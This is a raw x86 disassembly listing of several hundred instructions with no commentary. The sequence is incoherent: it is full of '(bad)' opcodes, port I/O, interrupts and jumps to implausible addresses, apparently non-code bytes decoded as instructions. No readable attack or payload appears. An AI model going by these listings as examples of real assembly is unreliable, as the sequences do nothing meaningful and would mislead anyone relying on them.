  41bd49:	sbb    BYTE PTR [edx+0x53],ch
  41bd4c:	cmp    eax,0x470e6099
  41bd51:	mov    eax,0x72420e0
  41bd56:	mov    esp,0xf11f2494
  41bd5b:	xor    BYTE PTR [eax],bl
  41bd5d:	int3   
  41bd5e:	add    al,0xe
  41bd60:	or     eax,0x9b828f82
  41bd65:	and    DWORD PTR [ebp+0x46],0x76
  41bd69:	movs   BYTE PTR es:[di],BYTE PTR gs:[si]
  41bd6c:	lods   eax,DWORD PTR ds:[esi]
  41bd6d:	ins    DWORD PTR es:[edi],dx
  41bd6e:	pop    eax
  41bd6f:	rcl    DWORD PTR [ebx-0x3c],cl
  41bd72:	mov    bh,0x0
  41bd74:	xchg   ebp,eax
  41bd75:	outs   dx,DWORD PTR ds:[esi]
  41bd76:	add    BYTE PTR [ebx],ah
  41bd78:	cpuid  
  41bd7a:	xor    eax,0xec91e683
  41bd7f:	fisub  WORD PTR [ecx]
  41bd81:	lock mov esp,0xd49a02dc
  41bd87:	fbld   TBYTE PTR [edx-0x5e]
  41bd8a:	dec    edi
  41bd8b:	mov    edi,0x596e9e23
  41bd90:	sub    ah,BYTE PTR [ecx]
  41bd92:	push   ecx
  41bd93:	mov    ecx,DWORD PTR [esi-0x439c812a]
  41bd99:	data16 jbe 0x41bdc4
  41bd9c:	add    eax,0xaabd9548
  41bda1:	test   DWORD PTR [edi+eax*4+0x14d4c613],esp
  41bda8:	pop    ds
  41bda9:	int3   
  41bdaa:	sub    esp,DWORD PTR ds:0x86e26bd8
  41bdb0:	pop    ds
  41bdb1:	scas   eax,DWORD PTR es:[edi]
  41bdb2:	test   al,0xc8
  41bdb4:	cdq    
  41bdb5:	and    BYTE PTR [edi-0x56],ah
  41bdb8:	scas   al,BYTE PTR es:[edi]
  41bdb9:	sbb    eax,0x59de450c
  41bdbe:	inc    ebx
  41bdbf:	popf   
  41bdc0:	push   ebx
  41bdc1:	or     eax,0x135439a1
  41bdc6:	xchg   edi,eax
  41bdc7:	pop    esp
  41bdc8:	or     eax,0x83de2b1b
  41bdcd:	push   esp
  41bdce:	pop    ecx
  41bdcf:	inc    ebx
  41bdd0:	add    al,0xfc
  41bdd2:	cmp    dh,0xd9
  41bdd5:	cmp    al,0xef
  41bdd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdd8:	(bad)  
  41bdd9:	(bad)  
  41bdda:	dec    DWORD PTR [edx]
  41bddc:	lods   eax,DWORD PTR ds:[esi]
  41bddd:	xchg   ecx,eax
  41bdde:	fwait
  41bddf:	std    
  41bde0:	mov    esp,?
  41bde2:	test   edi,esi
  41bde4:	sbb    cl,0xd0
  41bde7:	jno    0x41bdd3
  41bde9:	mov    ecx,0xe2a3c497
  41bdee:	icebp  
  41bdef:	outs   dx,DWORD PTR fs:[esi]
  41bdf1:	push   edx
  41bdf2:	inc    edx
  41bdf3:	lods   eax,DWORD PTR ds:[esi]
  41bdf4:	dec    ecx
  41bdf5:	mov    dh,0xc4
  41bdf7:	push   0x6ce6c408
  41bdfc:	sub    DWORD PTR [edx-0x4d],edi
  41bdff:	pop    ebp
  41be00:	sahf   
  41be01:	fsub   QWORD PTR [esi]
  41be03:	jo     0x41be0c
  41be05:	iret   
  41be06:	mov    eax,ds:0x43e5821b
  41be0b:	xchg   edi,eax
  41be0c:	push   es
  41be0d:	out    0xe8,eax
  41be0f:	(bad)  
  41be10:	xor    ch,ah
  41be12:	imul   edx,DWORD PTR [eax-0x2b1667a3],0xffffff9b
  41be19:	inc    esi
  41be1a:	cmp    dh,BYTE PTR [ebx-0x2eb3d917]
  41be20:	ja     0x41bda2
  41be22:	mov    eax,0x5d02b77b
  41be27:	fwait
  41be28:	jns    0x41bdaf
  41be2a:	mov    dl,0x4e
  41be2c:	scas   al,BYTE PTR es:[edi]
  41be2d:	push   eax
  41be2e:	xlat   BYTE PTR ds:[ebx]
  41be2f:	mov    edx,DWORD PTR [ecx]
  41be31:	in     eax,dx
  41be32:	jmp    0x41bdc8
  41be34:	test   eax,0x5b283918
  41be39:	or     DWORD PTR [ebp+0x56310665],ebp
  41be3f:	cmp    DWORD PTR [ecx+0x61],esp
  41be42:	repz mov bl,0x82
  41be45:	(bad)  
  41be47:	je     0x41be86
  41be49:	mov    ecx,0xf5a7b79
  41be4e:	lock fisub WORD PTR [edi-0x219af098]
  41be55:	and    BYTE PTR [edx+0x13],ch
  41be58:	mov    ebx,0xc3251491
  41be5d:	cli    
  41be5e:	ds int3 
  41be60:	mov    esp,0xc685b769
  41be65:	mov    cl,0x3d
  41be67:	cmp    al,0x53
  41be69:	inc    eax
  41be6a:	test   BYTE PTR [esp+eax*1],dl
  41be6d:	ds loop 0x41be36
  41be70:	fmul   DWORD PTR [ecx+0x63]
  41be73:	hlt    
  41be74:	jmp    FWORD PTR [edi+0x4e]
  41be77:	xchg   ecx,eax
  41be78:	mov    ebp,0x693600b0
  41be7d:	mov    eax,0x4c50978c
  41be82:	sub    DWORD PTR [edi-0x2846da21],0xcfe58ad
  41be8c:	dec    esp
  41be8d:	fdiv   QWORD PTR [ecx]
  41be8f:	dec    edx
  41be90:	inc    ecx
  41be91:	cmp    cl,BYTE PTR [ebx-0x39]
  41be94:	das    
  41be95:	pop    eax
  41be96:	sub    DWORD PTR [ecx-0x3a],ebp
  41be99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be9a:	adc    edx,DWORD PTR [edi-0x1f]
  41be9d:	sub    al,BYTE PTR [ecx]
  41be9f:	and    DWORD PTR [ebp+0x33908a22],0x6fcb2922
  41bea9:	cmc    
  41beaa:	xor    BYTE PTR [edi+0xe],bh
  41bead:	inc    ebp
  41beae:	adc    al,0xb7
  41beb0:	adc    eax,0x6cd2f38b
  41beb5:	pop    eax
  41beb6:	jg     0x41beb0
  41beb8:	loop   0x41be58
  41beba:	les    esp,FWORD PTR [edi-0x1f]
  41bebd:	xor    esi,DWORD PTR [ecx+0x5f]
  41bec0:	sub    BYTE PTR [edi-0x1d96372c],dh
  41bec6:	push   cs
  41bec7:	fld    st(4)
  41bec9:	cmp    ebp,esp
  41becb:	dec    ecx
  41becc:	nop
  41becd:	xchg   edx,eax
  41bece:	mov    al,0x7d
  41bed0:	adc    esi,DWORD PTR [edi-0x261efb11]
  41bed6:	push   bp
  41bed8:	push   ebx
  41bed9:	addr16 jge 0x41bf43
  41bedc:	aad    0xcb
  41bede:	mov    edx,DWORD PTR [ebp-0x1dfe0b58]
  41bee4:	cli    
  41bee5:	fldenv [edx-0x4b]
  41bee8:	jae    0x41beba
  41beea:	lods   eax,DWORD PTR ds:[esi]
  41beeb:	jbe    0x41befb
  41beed:	jmp    0xf93e782d
  41bef2:	lea    ebp,[edi+0x12]
  41bef5:	mov    al,ds:0x46b7f936
  41befa:	adc    al,0xf1
  41befc:	fild   WORD PTR [ebp-0x3c74299e]
  41bf02:	enter  0xaad2,0xff
  41bf06:	gs jecxz 0x41befe
  41bf09:	retf   
  41bf0a:	scas   eax,DWORD PTR es:[edi]
  41bf0b:	and    al,0x30
  41bf0d:	or     eax,edi
  41bf0f:	jne    0x41becb
  41bf11:	sbb    DWORD PTR [esi-0x34],esi
  41bf14:	jecxz  0x41beb6
  41bf16:	and    al,al
  41bf18:	add    DWORD PTR [edx-0x408c5c8b],ebx
  41bf1e:	loopne 0x41beb0
  41bf20:	cmp    BYTE PTR [eax+0xc],ah
  41bf23:	pop    ss
  41bf24:	mov    al,ds:0x5adf6272
  41bf29:	loopne 0x41bf45
  41bf2b:	push   eax
  41bf2c:	inc    edx
  41bf2d:	push   ss
  41bf2e:	or     eax,0x8d3382ea
  41bf33:	adc    DWORD PTR gs:[ebx+0x4cea17ff],esp
  41bf3a:	mov    cl,0x2a
  41bf3c:	xor    eax,esp
  41bf3e:	call   DWORD PTR [ebx-0xf]
  41bf41:	stos   DWORD PTR es:[edi],eax
  41bf42:	xlat   BYTE PTR fs:[ebx]
  41bf44:	sahf   
  41bf45:	and    BYTE PTR [eax],bh
  41bf47:	aad    0x8c
  41bf49:	xchg   ebp,eax
  41bf4a:	push   eax
  41bf4b:	adc    al,0x17
  41bf4d:	pop    esi
  41bf4e:	mov    esi,0x5089f485
  41bf53:	pop    DWORD PTR [esi]
  41bf55:	pushf  
  41bf56:	popa   
  41bf57:	loopne 0x41bf4f
  41bf59:	and    cl,BYTE PTR [edi+0x38]
  41bf5c:	jbe    0x41bf03
  41bf5e:	aaa    
  41bf5f:	adc    BYTE PTR [ebx],al
  41bf61:	dec    eax
  41bf62:	imul   ecx,DWORD PTR [ebx+edi*4-0x504663c6],0xd346ebee
  41bf6d:	popa   
  41bf6e:	dec    ebx
  41bf6f:	inc    ebp
  41bf70:	mov    BYTE PTR [edi+edi*2+0x6b],ah
  41bf74:	or     edi,DWORD PTR [edi+0x76ad5141]
  41bf7a:	inc    eax
  41bf7b:	out    0x58,al
  41bf7d:	add    ecx,DWORD PTR [ebp+0x56]
  41bf80:	mov    edx,0xb96ac5b1
  41bf85:	out    0x36,al
  41bf87:	test   BYTE PTR [edi+0x51],0xe7
  41bf8b:	pop    eax
  41bf8c:	sbb    eax,0x61a2f8f1
  41bf91:	(bad)  
  41bf93:	or     eax,0x6d1cde51
  41bf98:	xor    eax,0xb2eafce6
  41bf9d:	retf   
  41bf9e:	aas    
  41bf9f:	mov    ds:0xb51e7d2f,al
  41bfa4:	js     0x41bf7a
  41bfa6:	(bad)  
  41bfa8:	add    edx,DWORD PTR [ebx-0x77c3922a]
  41bfae:	or     eax,0x736dfb57
  41bfb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfb4:	push   eax
  41bfb5:	or     eax,0x4e43b478
  41bfba:	pop    ecx
  41bfbb:	add    cl,BYTE PTR [esi]
  41bfbd:	data16 lock mov dl,0x56
  41bfc1:	ror    ebp,0x97
  41bfc4:	data16 loop 0x41c025
  41bfc7:	mov    eax,0x662ebc36
  41bfcc:	add    eax,0xd0ba944c
  41bfd1:	pop    ebx
  41bfd2:	imul   edi,DWORD PTR [eax+0x200e89cc],0x127d259
  41bfdc:	fcmovb st,st(7)
  41bfde:	dec    esp
  41bfdf:	adc    ebx,ebx
  41bfe1:	mov    eax,0x722576be
  41bfe6:	inc    ecx
  41bfe7:	call   0xb76a170e
  41bfec:	jecxz  0x41bff3
  41bfee:	and    eax,0xbdcdf588
  41bff3:	in     al,dx
  41bff4:	sar    BYTE PTR [esi+ebx*2+0x4f242b76],0x95
  41bffc:	push   es
  41bffd:	dec    ebp
  41bffe:	mov    eax,ds:0x5df90b5b
  41c003:	adc    ebx,DWORD PTR [edi-0x63]
  41c006:	pusha  
  41c007:	and    al,0x2f
  41c009:	ret    
  41c00a:	push   esi
  41c00b:	add    BYTE PTR [ebx],bl
  41c00d:	les    ebp,FWORD PTR ds:0x6adee31
  41c013:	add    al,0x51
  41c015:	pop    edi
  41c016:	mov    DWORD PTR [esi-0x29b7c924],edx
  41c01c:	push   ecx
  41c01d:	inc    esp
  41c01e:	dec    ebp
  41c01f:	rcl    edx,cl
  41c021:	retf   
  41c022:	fisttp DWORD PTR ds:0x9f454e56
  41c028:	jecxz  0x41c07f
  41c02a:	fist   WORD PTR [edi+ebx*8]
  41c02d:	out    dx,al
  41c02e:	push   0x20
  41c030:	ror    DWORD PTR [edi-0x382467f6],1
  41c036:	push   esp
  41c037:	pop    es
  41c038:	xor    eax,0x3e4381f
  41c03d:	mov    ds:0xed7c4d3b,eax
  41c042:	mov    ds:0x44e2af43,eax
  41c047:	inc    ebp
  41c048:	cmp    eax,0x319a1051
  41c04d:	stos   BYTE PTR es:[edi],al
  41c04e:	das    
  41c04f:	sbb    eax,0x55571131
  41c054:	scas   al,BYTE PTR es:[edi]
  41c055:	dec    ecx
  41c056:	add    edx,DWORD PTR [ebx-0x5c805aec]
  41c05c:	cli    
  41c05d:	xor    bl,BYTE PTR [esi]
  41c05f:	popa   
  41c060:	mov    eax,?
  41c062:	cdq    
  41c063:	xchg   BYTE PTR [esp+edx*1],al
  41c066:	mov    ebp,0x7eec9f52
  41c06b:	xchg   ecx,eax
  41c06c:	sbb    DWORD PTR [ecx+0x30],0x480422ac
  41c073:	mov    WORD PTR [ecx+0x324ff065],fs
  41c079:	int3   
  41c07a:	jns    0x41c050
  41c07c:	retf   
  41c07d:	fnstsw WORD PTR ds:[ebx+esi*2-0x7b]
  41c082:	mov    eax,ds:0xaa82f243
  41c087:	(bad)  
  41c088:	(bad)  
  41c08a:	pusha  
  41c08b:	mov    dl,0x5b
  41c08d:	jbe    0x41c0c9
  41c08f:	xlat   BYTE PTR ds:[ebx]
  41c090:	shr    DWORD PTR [ecx+0x63460858],1
  41c096:	mov    ch,BYTE PTR [ebx]
  41c098:	call   DWORD PTR [ecx-0xfba415]
  41c09e:	ret    
  41c09f:	es test eax,0x2a0ef482
  41c0a5:	pop    eax
  41c0a6:	pop    ecx
  41c0a7:	gs xchg edi,eax
  41c0a9:	inc    esi
  41c0aa:	cli    
  41c0ab:	shl    bh,0xa6
  41c0ae:	xchg   esi,eax
  41c0af:	mov    dh,0x7c
  41c0b1:	push   es
  41c0b2:	mov    eax,0x1c3a612d
  41c0b7:	test   BYTE PTR gs:[ecx-0x3721104d],dl
  41c0be:	aas    
  41c0bf:	adc    ah,ch
  41c0c1:	ins    BYTE PTR es:[edi],dx
  41c0c2:	adc    esp,ebx
  41c0c4:	inc    edi
  41c0c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c6:	stos   DWORD PTR es:[edi],eax
  41c0c7:	add    DWORD PTR [ebp+0x6f],0x3d
  41c0cb:	int3   
  41c0cc:	repz loopne 0x41c07a
  41c0cf:	leave  
  41c0d0:	mov    ebx,0x5eb75907
  41c0d5:	mov    dh,0x50
  41c0d7:	pop    edx
  41c0d8:	push   es
  41c0d9:	mov    cl,0x73
  41c0db:	pushf  
  41c0dc:	ror    BYTE PTR [eax-0xfcab33b],cl
  41c0e2:	jl     0x41c0b8
  41c0e4:	call   0x2693:0x92ff491
  41c0eb:	loop   0x41c0be
  41c0ed:	sbb    bh,0xee
  41c0f0:	mov    ds:0xf7f01727,eax
  41c0f5:	xchg   ebp,eax
  41c0f6:	ficomp WORD PTR [ecx-0x42]
  41c0f9:	xlat   BYTE PTR ds:[ebx]
  41c0fa:	mov    edx,0x284f0e78
  41c0ff:	mov    BYTE PTR [ebx+esi*2+0x23],bl
  41c103:	inc    ecx
  41c104:	ret    
  41c105:	test   DWORD PTR [edx+0x142674dd],esp
  41c10b:	jp     0x41c103
  41c10d:	aas    
  41c10e:	pop    edx
  41c10f:	scas   al,BYTE PTR es:[edi]
  41c110:	xchg   ebp,eax
  41c111:	test   al,0xd0
  41c113:	sub    al,0x39
  41c115:	cmp    al,0x93
  41c117:	sahf   
  41c118:	add    ebx,DWORD PTR [eax]
  41c11a:	ds out 0x19,al
  41c11d:	aaa    
  41c11e:	push   cs
  41c11f:	mov    bl,0x24
  41c121:	punpckhbw mm2,QWORD PTR [ecx]
  41c124:	out    dx,eax
  41c125:	pusha  
  41c126:	rcr    DWORD PTR [ecx-0x12929026],1
  41c12c:	and    al,0x43
  41c12e:	sub    al,0x86
  41c130:	sbb    eax,0xff16d1b4
  41c135:	dec    esi
  41c136:	lods   eax,DWORD PTR ds:[esi]
  41c137:	dec    ebx
  41c138:	mov    al,0x4b
  41c13a:	mov    ecx,ebp
  41c13c:	scas   al,BYTE PTR es:[edi]
  41c13d:	shl    edi,0x80
  41c140:	jne    0x41c15a
  41c142:	sbb    edi,DWORD PTR [esi-0xfdee7f]
  41c148:	lea    esi,[ebp-0x7b04906a]
  41c14e:	stos   DWORD PTR es:[edi],eax
  41c14f:	mov    eax,ds:0x4402d2c6
  41c154:	scas   al,BYTE PTR es:[edi]
  41c155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c156:	in     al,dx
  41c157:	in     al,dx
  41c158:	inc    edx
  41c159:	aas    
  41c15a:	scas   eax,DWORD PTR es:[edi]
  41c15b:	sbb    eax,0xa5cffff0
  41c160:	cmp    al,0x34
  41c162:	imul   edx,DWORD PTR [ebx-0x71],0x1f6d0bd
  41c169:	mov    ch,0xda
  41c16b:	neg    BYTE PTR [edx+0x20]
  41c16e:	xchg   esi,eax
  41c16f:	mov    ecx,0x1a80b478
  41c174:	call   FWORD PTR [ebx+0x22]
  41c177:	pop    ecx
  41c178:	out    dx,al
  41c179:	dec    edi
  41c17a:	rol    DWORD PTR [ebx],0xa6
  41c17d:	sub    ch,BYTE PTR [ecx-0xad1d811]
  41c183:	(bad)  
  41c184:	cmp    edi,DWORD PTR [edx+0x38]
  41c187:	aas    
  41c188:	call   0x9de:0x488ed009
  41c18f:	cdq    
  41c190:	sbb    cl,ch
  41c192:	in     al,dx
  41c193:	iret   
  41c194:	dec    ebx
  41c195:	fst    st(6)
  41c197:	add    cl,dl
  41c199:	loopne 0x41c132
  41c19b:	pop    ebp
  41c19c:	aad    0x6b
  41c19e:	jb     0x41c138
  41c1a0:	or     dl,ah
  41c1a2:	imul   ecx,eax,0xc
  41c1a5:	jg     0x41c1cd
  41c1a7:	mov    edi,0x68e821be
  41c1ac:	add    BYTE PTR [edx-0x77],bh
  41c1af:	pop    esi
  41c1b0:	out    dx,al
  41c1b1:	aaa    
  41c1b2:	xor    esp,edx
  41c1b4:	fst    QWORD PTR [ebp+0x33687dc6]
  41c1ba:	mov    dl,0x8f
  41c1bc:	sub    DWORD PTR [edi-0x43],edi
  41c1bf:	jbe    0x41c1d8
  41c1c1:	xchg   ebx,eax
  41c1c2:	into   
  41c1c3:	dec    ebp
  41c1c4:	xor    eax,0x5ca445c1
  41c1c9:	pop    ecx
  41c1ca:	add    al,0xc5
  41c1cc:	cmp    edi,DWORD PTR [eax-0x1bdb174f]
  41c1d2:	div    ah
  41c1d4:	mov    WORD PTR [edi+0x4ee498f7],cs
  41c1da:	add    eax,0x5dd46bad
  41c1df:	or     al,0x5e
  41c1e1:	jge    0x41c1e0
  41c1e3:	jns    0x41c216
  41c1e5:	out    dx,eax
  41c1e6:	cdq    
  41c1e7:	inc    ecx
  41c1e8:	sub    dx,ax
  41c1eb:	mov    dl,0xa4
  41c1ed:	pop    edx
  41c1ee:	gs ja  0x41c246
  41c1f1:	xlat   BYTE PTR ds:[ebx]
  41c1f2:	xchg   BYTE PTR [esi],bl
  41c1f4:	mov    ds:0x2179abe1,eax
  41c1f9:	pop    ebx
  41c1fa:	pop    edx
  41c1fb:	shl    eax,cl
  41c1fd:	xor    esp,esp
  41c1ff:	cs inc esi
  41c201:	lds    ebp,FWORD PTR [edi]
  41c203:	mov    cl,0xd9
  41c205:	shl    ch,0x2a
  41c208:	call   0x2349cd17
  41c20d:	daa    
  41c20e:	fistp  DWORD PTR [esi-0x7c167830]
  41c214:	sub    eax,0x6a46804b
  41c219:	push   eax
  41c21a:	mov    edi,DWORD PTR [eax-0x21]
  41c21d:	lods   al,BYTE PTR ds:[esi]
  41c21e:	lods   eax,DWORD PTR ds:[esi]
  41c21f:	jno    0x41c1db
  41c221:	mov    ah,0xd0
  41c223:	sub    eax,0x51d850ed
  41c228:	out    0xd,eax
  41c22a:	outs   dx,DWORD PTR ds:[esi]
  41c22b:	pop    eax
  41c22c:	in     al,0x19
  41c22e:	cmp    eax,0x8c29d65c
  41c233:	xchg   edi,eax
  41c234:	mov    esp,0xf2476df7
  41c239:	outs   dx,BYTE PTR ds:[esi]
  41c23a:	lds    edi,FWORD PTR cs:[eax]
  41c23d:	lea    edi,[ebx]
  41c23f:	cmp    al,0xc8
  41c241:	(bad)  
  41c242:	les    ebp,FWORD PTR [edi-0x1dd794d]
  41c248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c249:	hlt    
  41c24a:	mov    BYTE PTR [ecx],bl
  41c24c:	xchg   edi,eax
  41c24d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c24e:	dec    ebp
  41c24f:	mov    ebx,0xecc2ad7f
  41c254:	mov    eax,ds:0xd1bd4fb1
  41c259:	push   ecx
  41c25a:	jae    0x41c276
  41c25c:	or     al,0x40
  41c25e:	loopne 0x41c2df
  41c260:	and    DWORD PTR [eax+ebx*2-0x37],esi
  41c264:	in     al,0x95
  41c266:	jbe    0x41c2ab
  41c268:	inc    esi
  41c269:	test   BYTE PTR [esi],0xed
  41c26c:	dec    esp
  41c26d:	and    DWORD PTR [ebx*1-0x2a787dd1],esp
  41c274:	adc    eax,0xc1f24d00
  41c279:	daa    
  41c27a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c27b:	scas   eax,DWORD PTR es:[edi]
  41c27c:	ins    BYTE PTR es:[edi],dx
  41c27d:	int3   
  41c27e:	cli    
  41c27f:	or     edx,DWORD PTR ds:0x1ba0f4af
  41c285:	jne    0x41c2a5
  41c287:	xchg   ecx,eax
  41c288:	mov    cl,BYTE PTR [ebp-0x386974a9]
  41c28e:	lock sub esp,esi
  41c291:	push   eax
  41c292:	fsub   DWORD PTR [ecx+edx*1]
  41c295:	push   ebx
  41c296:	xchg   BYTE PTR [esi],al
  41c298:	jnp    0x41c251
  41c29a:	xor    ebx,DWORD PTR [eax+0x79619f5]
  41c2a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2a1:	popf   
  41c2a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2a3:	mov    ah,0xa5
  41c2a5:	cmp    bh,BYTE PTR [ebx+0xf]
  41c2a8:	cmp    DWORD PTR [ebx],0x417d0b24
  41c2ae:	inc    edx
  41c2af:	outs   dx,BYTE PTR ds:[esi]
  41c2b0:	pop    ss
  41c2b1:	sub    al,0x4c
  41c2b3:	(bad)  
  41c2b4:	stc    
  41c2b5:	sub    al,0xf3
  41c2b7:	daa    
  41c2b8:	dec    ebp
  41c2b9:	or     eax,0x2b6c7da
  41c2be:	fiadd  WORD PTR [ecx+0x6d]
  41c2c1:	mov    dh,0x84
  41c2c3:	das    
  41c2c4:	(bad)  
  41c2c5:	in     al,0x54
  41c2c7:	mov    al,ds:0xa31c291
  41c2cc:	std    
  41c2cd:	push   ds
  41c2ce:	in     al,0x47
  41c2d0:	xchg   edx,eax
  41c2d1:	mov    bl,0xd
  41c2d3:	loop   0x41c2e1
  41c2d5:	fisubr WORD PTR [esi]
  41c2d7:	inc    edi
  41c2d8:	arpl   WORD PTR [ecx],ax
  41c2da:	test   bh,cl
  41c2dc:	add    ah,BYTE PTR [ecx]
  41c2de:	ficom  WORD PTR [eax+edi*2]
  41c2e1:	enter  0x7644,0x73
  41c2e5:	add    edx,DWORD PTR [edx]
  41c2e7:	out    0x79,eax
  41c2e9:	ds sbb eax,0x5841d88e
  41c2ef:	outs   dx,DWORD PTR ds:[esi]
  41c2f0:	pop    ecx
  41c2f1:	shr    BYTE PTR [edx],1
  41c2f3:	sbb    eax,0xbb1369a2
  41c2f8:	jecxz  0x41c2cb
  41c2fa:	jo     0x41c310
  41c2fc:	sar    esi,1
  41c2fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2ff:	std    
  41c300:	bound  eax,QWORD PTR [eax-0x2b]
  41c303:	pop    eax
  41c304:	cmc    
  41c305:	mov    eax,0xaf74f310
  41c30a:	mov    al,BYTE PTR [edi-0x62]
  41c30d:	jg     0x41c366
  41c30f:	jmp    0x584d18ca
  41c314:	aas    
  41c315:	in     al,0xa2
  41c317:	(bad)  
  41c318:	mov    eax,0xa19aaba5
  41c31d:	ret    0x89df
  41c320:	adc    bh,BYTE PTR [ecx+0x29038b1d]
  41c326:	sbb    eax,0xd788b9f9
  41c32b:	jo     0x41c38f
  41c32d:	lds    esp,FWORD PTR [ebx]
  41c32f:	or     al,0xea
  41c331:	mov    al,0xf5
  41c333:	pop    edi
  41c334:	push   edi
  41c335:	cli    
  41c336:	jno    0x41c2e1
  41c338:	enter  0xa7ed,0x64
  41c33c:	jmp    0x1aae:0x53db2a53
  41c343:	ds aad 0xfe
  41c346:	outs   dx,BYTE PTR ds:[esi]
  41c347:	fnstenv [ecx]
  41c349:	jbe    0x41c306
  41c34b:	xchg   BYTE PTR [edx],ch
  41c34d:	aaa    
  41c34e:	adc    BYTE PTR [ecx-0x25233ea7],dh
  41c354:	lahf   
  41c355:	mov    eax,0xcbb45334
  41c35a:	sar    BYTE PTR [edx-0x1e],cl
  41c35d:	push   ss
  41c35e:	adc    DWORD PTR [eax+0x7d3a8f48],edx
  41c364:	or     eax,0xa3fe406f
  41c369:	xor    al,0x9
  41c36b:	xchg   DWORD PTR [edx],edi
  41c36d:	rol    DWORD PTR [ebp-0x5f],1
  41c370:	push   esp
  41c371:	stc    
  41c372:	(bad)  ds:0xdab3b462
  41c378:	or     dl,bl
  41c37a:	jmp    0xf7977182
  41c37f:	(bad)  
  41c380:	je     0x41c361
  41c382:	loopne 0x41c3ea
  41c384:	sub    al,0x91
  41c386:	mov    edi,0x61d852fc
  41c38b:	cwde   
  41c38c:	mov    eax,0xd0d68e3b
  41c391:	ins    BYTE PTR es:[edi],dx
  41c392:	lds    esp,FWORD PTR es:[edi+0x7d2affcc]
  41c399:	je     0x41c31f
  41c39b:	mov    esp,0x1c183f07
  41c3a0:	loop   0x41c35a
  41c3a2:	(bad)  
  41c3a3:	and    BYTE PTR [eax+0x57],dh
  41c3a6:	cmp    al,0xb8
  41c3a8:	sub    al,0x38
  41c3aa:	sub    al,0x7e
  41c3ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3ad:	jne    0x41c37b
  41c3af:	add    cl,dh
  41c3b1:	or     edx,DWORD PTR [eax]
  41c3b3:	jbe    0x41c3d0
  41c3b5:	xor    DWORD PTR [ebp+0x4e],ebx
  41c3b8:	xchg   edi,eax
  41c3b9:	and    DWORD PTR [ecx],0xe7c5913b
  41c3bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3c0:	cmp    al,0x30
  41c3c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3c3:	fs adc eax,0xd4faaece
  41c3c9:	cmp    al,bl
  41c3cb:	sti    
  41c3cc:	push   ds
  41c3cd:	rcl    DWORD PTR [esi+eax*1-0x1896a15c],1
  41c3d4:	gs pop edx
  41c3d6:	leave  
  41c3d7:	cmp    BYTE PTR [edi-0x4d566030],dl
  41c3dd:	shl    DWORD PTR [ebp-0x5a],1
  41c3e0:	mov    al,0xd
  41c3e2:	cwde   
  41c3e3:	xor    al,0x69
  41c3e5:	mov    dl,0x83
  41c3e7:	pop    es
  41c3e8:	xor    BYTE PTR [edx+0x55e06d68],bl
  41c3ee:	pop    esp
  41c3ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3f0:	xor    eax,0x1916fd23
  41c3f5:	rol    BYTE PTR [esi-0x30],1
  41c3f8:	sbb    al,0xe1
  41c3fa:	ret    
  41c3fb:	sbb    eax,0xed5e25d3
  41c400:	aad    0x6a
  41c402:	fcom   DWORD PTR [esi]
  41c404:	mov    dl,BYTE PTR [esp+ebx*1+0x1b]
  41c408:	adc    al,0xa8
  41c40a:	out    0xea,al
  41c40c:	jge    0x41c40f
  41c40e:	or     bl,BYTE PTR [ebp+0x5a7d6aae]
  41c414:	fs sbb al,ah
  41c417:	or     BYTE PTR [esi-0x550953da],0x75
  41c41e:	fnsave [eax+0x5c]
  41c421:	sub    al,0xb1
  41c423:	arpl   WORD PTR [esi-0x2b],di
  41c426:	mov    ds:0x59cd31b2,eax
  41c42b:	shr    BYTE PTR [ecx],1
  41c42d:	cdq    
  41c42e:	shr    edi,cl
  41c430:	fcom   QWORD PTR [edx-0x128189a0]
  41c436:	(bad)  
  41c437:	out    0x7,al
  41c439:	or     esp,DWORD PTR [edx+ecx*8]
  41c43c:	popa   
  41c43d:	ds dec ebx
  41c43f:	inc    ebp
  41c440:	or     eax,0x54550c07
  41c445:	xor    DWORD PTR ds:0x5cfb4d6e,ebx
  41c44b:	inc    ebp
  41c44c:	jbe    0x41c3d3
  41c44e:	in     eax,dx
  41c44f:	mov    fs,WORD PTR [ebx]
  41c451:	nop
  41c452:	add    cl,ah
  41c454:	dec    eax
  41c455:	out    dx,eax
  41c456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c457:	pop    es
  41c458:	sbb    eax,0x24b80e6d
  41c45d:	dec    BYTE PTR [edx+0x5a482cc8]
  41c463:	adc    eax,0x68fee7b1
  41c468:	imul   edi,DWORD PTR [eax],0xde19f7c
  41c46e:	ins    BYTE PTR es:[edi],dx
  41c46f:	popa   
  41c470:	imul   edx,edi,0x7682429f
  41c476:	jecxz  0x41c497
  41c478:	and    esi,esi
  41c47a:	(bad)  
  41c47b:	pop    ebx
  41c47c:	cld    
  41c47d:	cmp    al,0x37
  41c47f:	std    
  41c480:	in     eax,0x7f
  41c482:	push   edi
  41c483:	stc    
  41c484:	push   esi
  41c485:	(bad)  
  41c486:	shr    ebx,cl
  41c488:	ss mov esi,0xc6fd0a5e
  41c48e:	ins    DWORD PTR es:[edi],dx
  41c48f:	es cmp al,0xd4
  41c492:	xor    ah,BYTE PTR [ebx+0x1a]
  41c495:	cmp    al,0xcf
  41c497:	(bad)  
  41c498:	inc    eax
  41c499:	lahf   
  41c49a:	cmp    dh,bh
  41c49c:	cdq    
  41c49d:	or     BYTE PTR [esi],cl
  41c49f:	xchg   ecx,eax
  41c4a0:	mov    ecx,0xeb4b0334
  41c4a5:	push   es
  41c4a6:	dec    edi
  41c4a7:	into   
  41c4a8:	call   0xf568:0x266bd78
  41c4af:	sub    esi,esi
  41c4b1:	add    al,0x8a
  41c4b3:	bound  ebx,QWORD PTR [esi]
